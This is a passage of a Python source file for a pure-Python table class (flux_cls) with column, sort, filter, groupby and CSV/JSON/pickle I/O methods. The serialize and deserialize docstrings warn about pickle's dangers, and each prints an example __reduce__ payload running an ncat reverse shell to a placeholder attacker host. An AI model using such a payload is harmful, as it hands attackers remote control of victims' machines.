
import gc

from array import array
from collections import Counter
from collections import namedtuple
from copy import deepcopy

from typing import ItemsView
from typing import KeysView
from typing import Generator
from typing import Iterator
from typing import List
from typing import Tuple
from typing import Dict
from typing import Union
from typing import Any

from .flux_row_cls import flux_row_cls

from ..util.filesystem import parse_file_extension
from ..util.filesystem import read_file
from ..util.filesystem import write_file
from ..util.filesystem import pickle_extensions
from ..util.filesystem import json_dumps_extended

from ..util import iter as util_iter
from ..util.iter import IterationDepthError
from ..util.iter import ColumnNameError
from ..util.iter import base_class_names
from ..util.iter import is_exhaustable
from ..util.iter import is_collection
from ..util.iter import standardize_variable_arity_values
from ..util.iter import iteration_depth
from ..util.iter import iterator_to_collection
from ..util.iter import map_values_to_enum
from ..util.iter import are_indices_contiguous
from ..util.iter import transpose
from ..util.iter import to_grouped_dict
from ..util.iter import is_header_row
from ..util.iter import is_subscriptable
from ..util.iter import values_as_strings

from ..util.text import print_runtime
from ..util.text import object_name
from ..util.text import surround_double_brackets
from ..util.text import surround_single_brackets
from ..util.text import format_integer
from ..util.text import function_parameters
from ..util.text import function_name
from ..util.text import vengeance_message
# from ..util.text import deprecated

from ..util.classes.namespace_cls import namespace_cls

from ..conditional import ordereddict
from ..conditional import line_profiler_installed
from ..conditional import numpy_installed

if numpy_installed:
    import numpy


class flux_cls:
    """ primary data subjugation class
    https://github.com/michael-ross-ven/vengeance_example/blob/main/vengeance_example/flux_example.py

    * similar idea behind a pandas DataFrame, but is more closely aligned with Python's design philosophy
    * when you're willing to trade for a little bit of speed for a lot simplicity
    * a pure-python, row-major wrapper class for list of list data
    * applies named attributes to rows -- attribute values are mutable during iteration
    * provides convenience aggregate operations (sort, filter, groupby, etc)
    * excellent for extremely fast prototyping and data subjugation

    """
    # indices for ._preview_as_* properties (may be slice or list of integers)
    preview_indices = slice(1, 5 + 1)

    def __init__(self, matrix=None):
        """
        # organized like csv data, attribute names are provided in first row
        matrix = [['attribute_a', 'attribute_b', 'attribute_c'],
                  ['a',           'b',           3.0],
                  ['a',           'b',           3.0],
                  ['a',           'b',           3.0]]
        flux = vengeance.flux_cls(matrix)
        """

        ''' @types '''
        self.headers: Dict[Union[str, bytes], int]
        self.matrix:  List[flux_row_cls]

        gc_enabled   = gc.isenabled()
        if gc_enabled: gc.disable()

        matrix  = self.__validate_matrix_as_primitive_values(matrix)
        headers = self.__validate_names_as_headers(matrix[0])
        matrix  = [flux_row_cls(headers, row, i) for i, row in enumerate(matrix)]

        if gc_enabled: gc.enable()

        self.headers = headers
        self.matrix  = matrix

    @property
    def _preview_as_tuples(self, preview_indices=None) -> List:
        """ to help with debugging """
        m = self.__validate_preview_matrix(preview_indices)
        h = m.pop(0)
        m = [list(zip(h, row)) for row in m]

        return m

    @property
    def _preview_as_array(self) -> Union[List, object]:
        """ to help with debugging

        PyCharm will recognize the numpy array and enable the "...view as array"
        option in the debugger which displays values in a special window as a table
        """
        m = self.__validate_preview_matrix()
        if numpy_installed:
            m = numpy.array(m, dtype=object)

        return m

    @property
    def num_cols(self) -> int:
        return len(self.matrix[0])

    @property
    def num_rows(self) -> int:
        """ header row is not included, compare to self.__len__ """
        return len(self.matrix) - 1

    def header_names(self, as_strings=True) -> List[Union[str, bytes]]:
        """
        self.matrix[0].values and self.headers.keys may not always be identical
            map_values_to_enum() makes certain modifications to self.headers.keys,
            such as coercing values to str, modifying duplicate values, etc
        """
        names = list(self.headers.keys())
        if as_strings:
            names = list(values_as_strings(names))

        return names

    def is_empty(self) -> bool:
        """ check if flux has *any* rows, even just a header row """
        for row in self.matrix:
            if row:
                return False

        return True

    def has_data(self) -> bool:
        """ check if flux has any rows below header row """
        for row in self.matrix[1:]:
            if row:
                return False

        return True

    def has_duplicate_row_pointers(self) -> bool:
        """
        if multiple row.values share pointers to the same underlying list,
        any modifications to one row will instantly affect other rows

        usually caused when creating lists with multiplication operator
            [v] * 100 is about 10x faster than [v for _ in range(100)]
            but causes duplicate pointer issue if v is a list

            this creates a list of pointers
            [[None, None, None]] * 100

            this doesn't
            [[None, None, None] for _ in range(1_000)]
        """
        rids = set()

        for row in self.matrix:
            rid = id(row.values)
            if rid in rids:
                return True

            rids.add(rid)

        return False

    def duplicate_row_pointers(self) -> Dict:
        """
        if multiple row.values share pointers to the same underlying list,
        any modifications to one row will instantly affect other rows

        usually caused when creating lists with multiplication operator
            [v] * 100 is about 10x faster than [v for _ in range(100)]
            but causes duplicate pointer issue if v is a list

            this creates a list of pointers
            [[None, None, None]] * 100

            this doesn't
            [[None, None, None] for _ in range(1_000)]

        yield dict of rows with duplicate .values pointers
        """
        enumrow_nt = namedtuple('EnumRow', ('i', 'row'))

        d = ordereddict()
        for i, row in enumerate(self.matrix):
            rid = id(row.values)
            rid = '\\x{:x}'.format(rid)

            row = enumrow_nt(i, row)

            if rid in d: d[rid].append(row)
            else:        d[rid] = [row]

        d = ordereddict((rid, rows) for rid, rows in d.items()
                                        if len(rows) > 1)
        return d

    def is_jagged(self) -> bool:
        """ if there is a mismatch of the length of any row.values """
        num_cols = len(self.headers)

        for row in self.matrix:
            if len(row) != num_cols:
                return True

        return False

    def jagged_rows(self) -> Generator[namedtuple, None, None]:
        """ if there is a mismatch of the length of any row.values
        yield EnumRow of jagged rows
        """
        enumrow_nt = namedtuple('EnumRow', ('i', 'row'))
        num_cols   = len(self.headers)

        for i, row in enumerate(self.matrix):
            if len(row) != num_cols:
                yield enumrow_nt(i, row)

    # region {filesystem methods}
    def to_file(self, path,
                      encoding=None,
                      filetype=None,
                      **kwargs):

        filetype = parse_file_extension(filetype or path,
                                        include_dot=True).lower()

        if filetype == '.csv':
            return self.to_csv(path, encoding, **kwargs)
        elif filetype == '.json':
            return self.to_json(path, encoding, **kwargs)
        elif filetype in pickle_extensions:
            return self.serialize(path, **kwargs)

        raise ValueError("invalid filetype: '{}' \nfiletype must be in {}"
                         .format(filetype, ['.csv', '.json'] + list(pickle_extensions)))

    @classmethod
    def from_file(cls, path,
                       encoding=None,
                       filetype=None,
                       **kwargs):

        filetype = parse_file_extension((filetype or path),
                                        include_dot=True).lower()

        if filetype == '.csv':
            return cls.from_csv(path, encoding, **kwargs)
        if filetype == '.json':
            return cls.from_json(path, encoding, **kwargs)
        if filetype in pickle_extensions:
            return cls.deserialize(path, **kwargs)

        raise ValueError("invalid filetype: '{}' \nfiletype must be in {}"
                         .format(filetype, ['.csv', '.json'] + list(pickle_extensions)))

    def to_csv(self, path,
                     encoding=None,
                     **kwargs):

        write_file(path, self.values(), encoding, filetype='.csv', **kwargs)
        return self

    @classmethod
    def from_csv(cls, path,
                      encoding=None,
                      **kwargs):

        m = read_file(path, encoding, filetype='.csv', **kwargs)
        return cls(m)

    def to_string(self, encoding=None, **kwargs) -> str:
        """ aliased to flux_cls.to_json(path=None) """
        return self.to_json(path=None,
                            encoding=encoding,
                            **kwargs)

    def to_json(self, path=None,
                      encoding=None,
                      **kwargs) -> Union[object, str]:

        o = list(self.dicts())

        if path is None:
            j_str = json_dumps_extended(o, **kwargs)
            return j_str
        else:
            write_file(path, o, encoding, filetype='.json', **kwargs)
            return self

    @classmethod
    def from_json(cls, path,
                       encoding=None,
                       **kwargs):

        o = read_file(path, encoding, filetype='.json', **kwargs)
        return cls(o)

    def serialize(self, path, **kwargs):
        """
        *** SECURITY VULNERABILITY ***

        although convenient, pickle introduces significant security flaws
        you should be sure no malicious actors have access to the location of these files

        eg:
        if your pickle file were replaced with bytes that deserialized into a method
        like this, you are f*cked
            def __reduce__(self):
                import os
                # gives user root shell, its all over
                return (os.system, 'ncat -e powershell.exe hacker.man 4444')
        """
        write_file(path, self, filetype='.flux', **kwargs)
        return self

    @classmethod
    def deserialize(cls, path, **kwargs):
        """
        *** SECURITY VULNERABILITY ***

        although convenient, pickle introduces significant security flaws
        you should be sure no malicious actors have access to the location of these files

        eg:
        if your pickle file were replaced with bytes that deserialized into a method
        like this, you are f*cked
            def __reduce__(self):
                import os
                # gives user root shell, its all over
                return (os.system, 'ncat -e powershell.exe hacker.man 4444')
        """
        return read_file(path, filetype='.flux', **kwargs)
    # endregion

    # region {row methods}
    def values(self, r_1=0, r_2=None) -> Generator[Union[List, Tuple], None, None]:
        """
        t = self.matrix_data_type()

        if t is flux_row_cls:
            return (row.values for row in self.matrix[r_1:r_2])
        elif t is namespace_cls:
            return (list(row.__dict__.values()) for row in self.matrix[r_1:r_2])
        elif t is ...:
            ...
        """
        return ([*row.values] for row in self.matrix[r_1:r_2])

    def dicts(self, r_1=1, r_2=None) -> Generator[Dict, None, None]:
        names = self.header_names()
        return (ordereddict(zip(names, row.values)) for row in self.matrix[r_1:r_2])

    def namedrows(self, r_1=1, r_2=None) -> Generator[namespace_cls, None, None]:
        """ speeds up attribute accesses by about 4x, maintains mutability """
        names = self.header_names()
        return (namespace_cls(zip(names, row.values)) for row in self.matrix[r_1:r_2])

    def namedtuples(self, r_1=1, r_2=None) -> Generator[namedtuple, None, None]:
        """ speeds up attribute accesses by about 4x """
        row_nt = namedtuple('Row', self.header_names(as_strings=True))
        return (row_nt(*row.values) for row in self.matrix[r_1:r_2])

    def insert_rows(self, i, rows):
        if self.is_empty():
            return self.reset_matrix(rows)

        is_append = (i is None)
        if i == 0:
            i = 1

        h = self.headers
        m = self.__validate_matrix_as_primitive_values(rows)

        if is_header_row(m[0], h):
            del m[0]

        if m == [[]]:
            return self

        if is_append:
            m = [flux_row_cls(h, row, _i_) for _i_, row in enumerate(m, len(self.matrix))]
        else:
            m = [flux_row_cls(h, row) for row in m]

        if is_append:
            self.matrix.extend(m)
        else:
            self.matrix[i:i] = m

        return self

    def append_rows(self, rows):
        return self.insert_rows(None, rows)
    # endregion

    # region {column methods}
    def columns(self, *names) -> Generator[Any, None, None]:
        """
        return a one-dimensional list if single column name:
            ['a', 'a', 'a' ...] = list(flux.columns('col_a'))

            flux_b['col_a'] = flux_a['col_a']

        return a two-dimensional list if multiple column names:
            [('a', 'a', 'a', ...),
             ('b', 'b', 'b', ...)] = list(flux.columns('col_a', 'col_b'))

        a, b, c = flux.columns('col_a', 'col_b', 'col_c')
        a, b, c = flux['col_a', 'col_b', 'col_c']
        for a, b, c in zip(*flux[:3]):
            pass
        """
        if names == ():
            names = self.header_names()
        else:
            names = self.__validate_names_not_empty(names, depth_offset=-1)

        rva = self.__row_values_accessor(names)
        col = (rva(row) for row in self.matrix[1:])

        has_multiple_columns = isinstance(names, slice) or \
                               (is_collection(names) and len(names) > 1)
        if has_multiple_columns:
            col = transpose(col, astype=list)

        return col

    def zip(self, *names) -> Generator[Any, None, None]:
        """ add , rowtype=flux_row_cls parameter? """
        if names == ():
            names = slice(0, self.num_cols)

        rva = self.__row_values_accessor(names)
        return (rva(row) for row in self)

    def reassign_columns(self, *names):
        if self.is_empty():
            raise ValueError('matrix is empty')

        names = standardize_variable_arity_values(names, depth=1)
        if not names:
            return self

        if isinstance(names, dict):
            names = [names]

        headers = self.headers.copy()
        names   = [self.__validate_renamed_or_inserted_column(name, headers) for name in names]

        all_columns  = [row.values for row in self.matrix[1:]]
        all_columns  = list(transpose(all_columns, astype=list))
        empty_column = [None] * self.num_rows

        m = []

        for n in names:
            if n in headers:
                column = all_columns[headers[n]]
            else:
                column = empty_column

            m.append([n] + column)

        m = transpose(m)
        m = list(m)
        self.reset_matrix(m)

        return self

    def rename_columns(self, old_to_new_mapping):
        if not isinstance(old_to_new_mapping, dict):
            raise TypeError('old_to_new_mapping must be a dictionary')

        names = self.header_names()
        for h_old, h_new in old_to_new_mapping.items():
            i = self.headers[h_old]
            names[i] = h_new

        self.reset_headers(names)

        return self

    def append_columns(self, *names, values=None):
        names = standardize_variable_arity_values(names, depth=1)
        if not names:
            return self

        self.__validate_no_duplicate_names(names)
        self.__validate_no_names_intersect_with_headers(names, self.headers)

        values           = self.__validate_column_value_dimensions(names, values)
        is_single_column = (len(names) == 1)
        header_names     = self.header_names() + list(names)

        for row, v in zip(self.matrix[1:], values):
            if is_single_column:
                row.values.append(v)
            else:
                row.values.extend(v)

        self.reset_headers(header_names)

        return self

    def insert_columns(self, *names, after=False):
        """ eg:
            flux.insert_columns((0,  'inserted'))        insert as first column
            flux.insert_columns((3,  'inserted'))        insert column before 4th column
            flux.insert_columns((-1, 'inserted'))        insert column at end

            flux.insert_columns((1, 'inserted_a'),       insert multiple columns before 1st column
                                (1, 'inserted_b'),
                                (1, 'inserted_c'))

            flux.insert_columns(('col_c', 'inserted'))               insert column before column 'col_c'

        note on inner / outer loop performance:
            because python struggles on very tight loops,
            it's faster to use the matrix loop as the inner loop

            * faster:
            for i in indices:
                for row in self.matrix[1:]:
                    ...

            * slower:
            for row in self.matrix[1:]:
                for i in indices:
                    ...
        """
        names = standardize_variable_arity_values(names, depth=1)
        if not names:
            return self

        names = self.__validate_insertion_names(names, self.headers)
        names = list(reversed(names))

        header_names = self.header_names()

        for before, header in names:
            if isinstance(before, int): i = before
            else:                       i = header_names.index(before)

            if after:
                i += 1

            header_names.insert(i, header)

        indices = sorted([header_names.index(h) for _, h in names])

        for i in indices:
            for row in self.matrix[1:]:
                row.values.insert(i, None)

        self.reset_headers(header_names)

        return self

    def delete_columns(self, *names):
        """
        method will fail if columns are jagged, do a try / except on del row.values[i]
        then length check on row values if failure?

        note on inner / outer loop performance:
            because python struggles on very tight loops,
            it's faster to use the matrix loop as the inner loop

            * faster:
            for i in indices:
                for row in self.matrix[1:]:
                    ...

            * slower:
            for row in self.matrix[1:]:
                for i in indices:
                    ...
        """
        names = standardize_variable_arity_values(names, depth=1)
        if not names:
            return self

        indices = self.__validate_names_as_indices(names, self.headers)
        indices = self.__validate_no_duplicate_names(indices)

        if set(indices) == set(self.headers.values()):
            return self.reset_matrix(None)

        indices.sort(reverse=True)

        for i in indices:
            for row in self.matrix:
                del row.values[i]

        self.reset_headers()

        return self
    # endregion

    def matrix_data_type(self) -> str:
        if self.is_empty():
            return 'NoneType'

        t = type(self.matrix[0])
        t = object_name(t)

        return t

    def reset_headers(self, names=None):
        """
        simply re-assigning self.headers to a new variable (eg, self.headers = dict())
        will de-reference all flux_row_cls._headers in matrix,  so self.headers
        must be cleared, then updated
        """
        use_existing_headers = (names is None)
        if self.is_empty():
            self.headers = self.__validate_names_as_headers(names)
            self.matrix  = [flux_row_cls(self.headers, names, 0)]

            return self

        if use_existing_headers:
            names = self.matrix[0].values

        headers = map_values_to_enum(names)
        self.headers.clear()
        self.headers.update(headers)

        if not use_existing_headers:
            self.matrix[0].values = list(headers.keys())

        return self

    def reset_matrix(self, m):
        gc_enabled   = gc.isenabled()
        if gc_enabled: gc.disable()

        matrix  = flux_cls.__validate_matrix_as_primitive_values(m)
        headers = flux_cls.__validate_names_as_headers(matrix[0])
        matrix  = [flux_row_cls(headers, row, i) for i, row in enumerate(matrix)]

        if gc_enabled: gc.enable()

        self.headers = headers
        self.matrix  = matrix

        return self

    def execute_commands(self, commands,
                               profiler=False,
                               print_commands=False):
        """ perform all transformations defined as list of method names in commands
        usually called by flux subclasses to encapsulate all state transformations

        eg profiler='print_runtime', print_commands=False:
            ν: flux_cls.execute_commands
                   @flux_exercise_cls._init_columns: 326 μs
                   @flux_exercise_cls._aggregate_products: 236 μs
        eg profiler='print_runtime', print_commands=True:
            ν: flux_cls.execute_commands
               ⟨0⟩  @flux_exercise_cls._init_columns()
                   @flux_exercise_cls._init_columns: 367 μs
               ⟨1⟩  @flux_exercise_cls._aggregate_products()
                   @flux_exercise_cls._aggregate_products: 219 μs
        """
        # region {closure}
        def print_command():
            pc = []
            if command.args:   pc.append('*{}'.format(command.args))
            if command.kwargs: pc.append('**{}'.format(command.kwargs))

            sc = '{}{}  @{}({})'.format(indent_align,
                                        surround_single_brackets(i),
                                        function_name(command.method),
                                        ', '.join(pc))
            print(sc)
        # endregion

        command_namedtuple = namedtuple('Command', ('name',
                                                    'attr',
                                                    'method',
                                                    'args',
                                                    'kwargs'))

        profiler = self.__validate_profiler_function(profiler)
        commands = self.__validate_command_methods(commands, command_namedtuple)

        indent_align = (' ' * 4)
        if print_commands and profiler:
            indent_align += (' ' * 3)

        if print_commands or 'print_runtime' in function_name(profiler):
            s = function_name(self.execute_commands)
            s = vengeance_message(s)
            print(s)

        completed_commands = []
        for i, command in enumerate(commands):
            if print_commands:
                print_command()

            method = command.method
            if profiler:
                method = profiler(method)

            method(*command.args, **command.kwargs)
            completed_commands.append(command)

        if print_commands or profiler:
            if hasattr(profiler, 'print_stats'):
                profiler.print_stats()

            print()

        return completed_commands

    def shorten_to(self, nrows):
        if nrows == 0:
            nrows = 1
        elif nrows < 0:
            raise ValueError('nrows must be positive')

        del self.matrix[nrows + 1:]

        return self

    def joined_rows(self, other,
                          names_self,
                          names_other=None) -> Generator[Tuple[flux_row_cls, flux_row_cls], None, None]:
        """
        other: Union[flux_cls, dict, str, tuple, list]

        eg:
            for row_self, row_other in flux_a.joined_rows(flux_b,
                                                         names_self='name',
                                                         names_other='other_name'}):
                row_self.cost   = row_other.cost
                row_self.weight = row_other.weight

            for row_self, row_other in flux_a.joined_rows(flux_b.map_rows('name', rowtype='namedtuple'),
                                                         'name'):
                row_self.cost   = row_other.cost
                row_self.weight = row_other.weight

        join with multiple rows
            for row_self, rows_other in flux_a.joined_rows(flux_b.map_rows_append('name'),
                                                          'name'):
                row_self.cost   = sum(row_other.cost   for row_other in rows_other)
                row_self.weight = sum(row_other.weight for row_other in rows_other)
        """
        names_self = self.__validate_names_not_empty(names_self, self.headers, depth=0)
        rva        = self.__row_values_accessor(names_self)

        if isinstance(other, flux_cls):
            if names_other is None:
                names_other = names_self

            mapping_other = other.map_rows(names_other)
        elif isinstance(other, dict):
            mapping_other = other
        elif is_collection(other):
            mapping_other = {item: item for item in other}
        else:
            raise TypeError('other types must be in (flux_cls, dict or some iterable)')

        for row_self in self.matrix[1:]:
            key_both  = rva(row_self)
            row_other = mapping_other.get(key_both)

            if row_other:
                yield row_self, row_other

    def reverse(self):
        self.matrix[1:].reverse()

        return self

    def reversed(self):
        flux = self.copy()
        flux.matrix[1:] = list(reversed(flux.matrix[1:]))

        return flux

    def sort(self, *names, reverse=False):
        """ in-place sort

        eg:
            flux.sort('col_a')
            flux.sort('col_a', 'col_b', 'col_c',
                      reverse=[True, False, True])
        """
        names = standardize_variable_arity_values(names, depth=1)
        if not names:
            return self

        self.matrix[1:] = self.__sort_rows(self.matrix[1:],
                                           names,
                                           reverse)
        return self

    def sorted(self, *names, reverse=False):
        """ :return: sorted flux_cls

        eg:
            flux = flux.sorted('col_a')
            flux = flux.sorted('col_a', 'col_b', 'col_c',
                               reverse=[False, True, True])
        """
        names = standardize_variable_arity_values(names, depth=1)
        if not names:
            return self.copy()

        flux = self.copy()
        flux.matrix[1:] = self.__sort_rows(flux.matrix[1:],
                                           names,
                                           reverse)
        return flux

    def __sort_rows(self, rows, names, reverses):
        reverses = [bool(v) for v in standardize_variable_arity_values(reverses, depth=1)]

        n = len(names) - len(reverses)
        reverses.extend([False] * n)

        all_true  = all((v is True) for v in reverses)
        all_false = all((v is False) for v in reverses)

        if all_true or all_false:
            rva = self.__row_values_accessor(names)
            rows.sort(key=rva, reverse=reverses[0])

            return rows

        # multiple sorting must be done in reverse order,
        # with last name sorted first, first name sorted last
        names    = list(reversed(names))
        reverses = list(reversed(reverses))

        for name, rev in zip(names, reverses):
            rva = self.__row_values_accessor(name)
            rows.sort(key=rva, reverse=rev)

        return rows

    def filter(self, f, *args, **kwargs):
        """ in-place """
        self.matrix[1:] = [row for row in self.matrix[1:]
                               if f(row, *args, **kwargs)]
        return self

    def filtered(self, f, *args, **kwargs):
        """ :return: new flux_cls """
        flux = self.copy()
        flux.matrix[1:] = [row for row in flux.matrix[1:]
                               if f(row, *args, **kwargs)]
        return flux

    def filter_by_unique(self, *names):
        return self.__filter_unique_rows(*names, in_place=True)

    def filtered_by_unique(self, *names):
        return self.__filter_unique_rows(*names, in_place=False)

    def __filter_unique_rows(self, *names, in_place):
        # region {closure functions}
        u   = set()
        rva = self.__row_values_accessor(names)

        def evaluate_unique(row):
            v = rva(row)

            if v not in u:
                u.add(v)
                return True
            else:
                return False
        # endregion

        if in_place:
            self.filter(evaluate_unique)
        else:
            return self.filtered(evaluate_unique)

    def map_rows(self, *names, rowtype=flux_row_cls) -> Dict:
        """
        return dictionary of rows:
            {'column_value': row}

        valid rowtypes = {'flux_row_cls',
                          'namedrow',
                          'namedtuple',
                          'tuple',
                          'list',
                          'dict'}
        """
        items = self.__zip_keys_and_rows(names, rowtype=rowtype)
        mrows = ordereddict(items)

        return mrows

    def map_rows_append(self, *names, rowtype=flux_row_cls) -> Dict[Any, List]:
        """
        return dictionary of lists of rows:
            {'column_value': [row, row, row]}

        valid rowtypes = {'flux_row_cls',
                          'namedrow',
                          'namedtuple',
                          'tuple',
                          'list',
                          'dict'}
        """
        items = self.__zip_keys_and_rows(names, rowtype=rowtype)

        # a defaultdict is not guaranteed to be insertion-ordered
        mrows = ordereddict()
        for k, row in items:
            if k in mrows: mrows[k].append(row)
            else:          mrows[k] = [row]

        return mrows

    def map_rows_nested(self, *names, rowtype=flux_row_cls) -> Dict[Any, Dict]:
        """ aliased by flux_cls.groupby()
        return dictionary of dictionaries of lists of rows:
            {'column_value_a': {'column_value_b': [row, row, row]}}

        valid rowtypes = {'flux_row_cls',
                          'namedrow',
                          'namedtuple',
                          'tuple',
                          'list',
                          'dict'}
        """
        mrows = self.map_rows_append(*names, rowtype=rowtype)

        has_multiple_columns = isinstance(names, slice) or \
                               (is_collection(names) and len(names) > 1)
        if has_multiple_columns:
            mrows = to_grouped_dict(mrows)

        return mrows

    def groupby(self, *names, rowtype=flux_row_cls) -> Dict[Any, Dict]:
        """ aliased to flux_cls.map_rows_nested() """
        return self.map_rows_nested(*names, rowtype=rowtype)

    def __zip_keys_and_rows(self, names, rowtype):
        rowtype = self.__validate_mapped_rowtype(rowtype)

        rva  = self.__row_values_accessor(names)
        keys = (rva(row) for row in self.matrix[1:])

        if rowtype   == 'flux_row_cls': values = iter(self.matrix[1:])
        elif rowtype == 'dict':         values = self.dicts()
        elif rowtype == 'namedrow':     values = self.namedrows()
        elif rowtype == 'namedtuple':   values = self.namedtuples()
        elif rowtype == 'list':         values = (list(row.values)  for row in self.matrix[1:])
        elif rowtype == 'tuple':        values = (tuple(row.values) for row in self.matrix[1:])
        else:
            raise TypeError('invalid rowtype: {}'.format(rowtype))

        return zip(keys, values)

    def unique(self, *names) -> KeysView:
        """
        maintains original order of unique values as they appear in matrix,
        that's why ordereddict keys are returned instead of a set
        """
        rva   = self.__row_values_accessor(names)
        items = ((rva(row), None) for row in self.matrix[1:])

        return ordereddict(items).keys()

    def contiguous(self, *names) -> Generator[namedtuple, None, None]:
        """ :return: yield (value, i_1, i_2) namedtuple where values are contiguous
        """
        if self.is_empty():
            return

        contiguous_nt = namedtuple('Contiguous', ('value',
                                                  'i_1',
                                                  'i_2',
                                                  'rows'))

        rows = iter(self.matrix[1:])
        rva  = self.__row_values_accessor(names)

        v_1 = rva(next(rows))
        v_2 = v_1
        i_1 = 1

        for i_2, row in enumerate(rows, 2):
            v_2 = rva(row)

            if v_1 != v_2:
                yield contiguous_nt(v_1,
                                    i_1,
                                    i_2 - 1,
                                    self.matrix[i_1:i_2])
                v_1 = v_2
                i_1 = i_2

        yield contiguous_nt(v_2,
                            i_1,
                            self.num_rows,
                            self.matrix[i_1:])

    def range(self, start=1, stop=None, step=1):
        """
        integers corresponding to each row's index position in matrix
        eg:
            [1, 2, 3, ..., len(flux.matrix)] = list(flux.indices(start=1))
            [0, 1, 2, ..., len(flux.matrix)] = list(flux.indices(start=0))

            flux['enum'] = flux.indices(start=1)
        """
        if stop is None:
            stop = len(self.matrix)

        return range(start, stop, step)

    def enumerate(self, start=1, stop=None):
        return enumerate(self.matrix[start:stop], start)

    def label_rows(self, start=0, label_function=None):
        """ meant to assist with debugging;

        label each flux_row_cls.__dict__ with an index, which will then appear
        in each row's __repr__ function and make them easier to identify after
        filtering, sorting, etc
        """
        is_callable = callable(label_function)

        for i, row in enumerate(self.matrix, start):
            if is_callable:
                row.row_label = label_function(i, row)
            else:
                row.row_label = i

        return self

    def clear_row_labels(self):
        for row in self.matrix:
            row.row_label = None

        return self

    def copy(self, deep=False):
        if deep:
            return deepcopy(self)

        other_attributes = {k: v for k, v in self.__dict__.items()
                                 if k not in {'headers', 'matrix'}}

        values = [[*row.values] for row in self.matrix]
        flux = self.__class__(values)
        flux.__dict__.update(other_attributes)

        return flux

    def row_values_accessor(self, *names) -> callable:
        """ public method for .__row_values_accessor()

        eg,
            rva = flux.row_values_accessor('col_a', 'col_b', 'col_c')
            for row in flux:
                a, b, c = rva(row)
        """
        return self.__row_values_accessor(names)

    def __row_values_accessor(self, names) -> callable:
        """ :return: a function that can be called for each row in self.matrix
        to retrieve column values
        """
        # region {closure functions}
        def row_value(row):
            return row.values[rva_indices]

        def row_values(row):
            return tuple([row.values[i] for i in rva_indices])

        def row_values_slice(row):
            return tuple(row.values[rva_indices])

        def row_values_all(row):
            return tuple(row.values)
        # endregion

        rva_name, rva_indices = self.__validate_row_values_accessor(names, self.headers)

        rva_mapping = {'row_value':        row_value,
                       'row_values':       row_values,
                       'row_values_slice': row_values_slice,
                       'row_values_all':   row_values_all,
                       'callable':         rva_indices}
        rva = rva_mapping[rva_name]

        return rva

    def __len__(self):
        """ includes header row, see self.num_rows """
        return len(self.matrix)

    def __getitem__(self, names) -> Generator[Any, None, None]:
        return self.columns(names)

    def __setitem__(self, name, values):
        """ sets values to a single column

        if values is an iterable, its length is expected to match len(self.matrix) - 1

        eg:
            flux['col'] = None
            flux['col'] = ['blah'] * flux.num_rows
            flux[-1]    = ['blah'] * flux.num_rows

        eg, insert column:
            flux[(0, 'new_col')] = ['blah'] * flux.num_rows
        """
        # name = standardize_variable_arity_values(name, depth=0)

        if isinstance(name, tuple) and len(name) == 2:
            arg_1, arg_2 = name

            first_arg_in_headers  = (isinstance(arg_1, int) or arg_1 in self.headers)
            second_arg_in_headers = (arg_2 in self.headers)

            if not first_arg_in_headers:
                raise ValueError('__setitem__ cannot be used to set values to multiple columns')
            elif second_arg_in_headers:
                raise ValueError("__setitem__ insertion called on column that already exists: '{}'".format(arg_2))
            elif first_arg_in_headers and (not second_arg_in_headers):
                self.insert_columns((arg_1, arg_2))

            name = arg_2

        elif isinstance(name, slice):
            raise ValueError('__setitem__ cannot be used to set values to multiple columns')
        elif iteration_depth(name) > 0:
            raise ValueError('__setitem__ cannot be used to set values to multiple columns')

        column_already_exists = (isinstance(name, int) or name in self.headers)

        if not column_already_exists:
            self.append_columns(name, values=values)
        else:
            values = self.__validate_column_value_dimensions([name], values)
            i      = self.__validate_names_as_indices(name, self.headers)[0]

            for row, v in zip(self.matrix[1:], values):
                row.values[i] = v

    def __iter__(self) -> Iterator[flux_row_cls]:
        """
        eg:
            for row in flux:
                row.col_a = 'a'
        """
        return iter(self.matrix[1:])

    def __reversed__(self):
        return reversed(self.matrix[1:])

    def __add__(self, rows):
        flux = self.copy()
        flux.append_rows(rows)

        return flux

    def __iadd__(self, rows):
        return self.append_rows(rows)

    def __getstate__(self):
        """
        called by deepcopy and pickle.dump
        """
        args   = []
        kwargs = ordereddict()
        params = function_parameters(self.__class__)

        for p in params:

            if p.name   == 'self':      continue
            elif p.name == 'matrix':    p.value = [[*row.values] for row in self.matrix]
            elif p.name == 'headers':   p.value = deepcopy(self.headers)
            elif hasattr(self, p.name): p.value = deepcopy(getattr(self, p.name))

            elif hasattr(p.value, '__name__') and p.value.__name__ == '_empty':
                error_repr = '__init__({}):'.format(', '.join(p.name for p in params))
                raise ValueError("{} unable to resolve argument '{}'".format(error_repr, p.name))

            if 'positional' in p.kind.lower():
                args.append(p.value)
            else:
                kwargs[p.name] = p.value

        return {'args':   tuple(args),
                'kwargs': kwargs}

    def __setstate__(self, state):
        """
        called by deepcopy and pickle.load
        """
        if not isinstance(state, dict):
            # return self.__init__(state)
            raise NotImplementedError

        use_constructor = ('args'   in state and
                           'kwargs' in state)
        if use_constructor:
            self.__init__(*state['args'], **state['kwargs'])
        else:
            self.__dict__.update(state)

    def __repr__(self):
        class_name   = self.__class__.__name__
        jagged_label = ''

        if self.is_empty():
            num_rows = '0'
            headers  = ''
        else:
            num_rows = len(self.matrix) - 1
            num_rows = '1+' + format_integer(num_rows)

            headers  = self.header_names(as_strings=True)
            headers  = ', '.join(headers)

            if self.is_jagged():
                if self.has_duplicate_row_pointers():
                    jagged_label = '☛dup_row_pointers☛ 🗲jagged🗲  '
                else:
                    jagged_label = '🗲jagged🗲  '

        num_rows = surround_single_brackets(num_rows)
        headers  = surround_double_brackets(headers)

        return '{}: {}{} {}'.format(class_name, jagged_label, num_rows, headers)

    # region {validation functions}
    @staticmethod
    def __validate_names_as_headers(names):
        headers = map_values_to_enum(names)

        conflicting = headers.keys() & set(flux_row_cls.reserved_names())
        if conflicting:
            conflicting = list(sorted(conflicting))
            raise ColumnNameError('column name conflict with existing headers: {}'.format(conflicting))

        return headers

    # noinspection PyProtectedMember
    @staticmethod
    def __validate_matrix_as_primitive_values(m):
        """
        standardize matrix types to list-of-lists; headers in first row

        hmm
            if 'flux_cls' in base_cls_names:
                return [[*row.values] for row in m.matrix]

            _m_ = [m.columns.values.tolist()]
            _m_.extend(m.values.tolist())
            return _m_
        """
        base_cls_names     = set(base_class_names(m))
        is_vengeance_class = bool(base_cls_names & util_iter.vengeance_cls_names)

        if is_vengeance_class:
            return list(m.values())

        if 'DataFrame' in base_cls_names:
            return [m.columns.values.tolist()] + \
                    m.values.tolist()

        if 'ndarray' in base_cls_names:
            return m.tolist()

        if (m is None) or (m == []) or (m == [[]]):
            return [[]]

        if is_exhaustable(m):
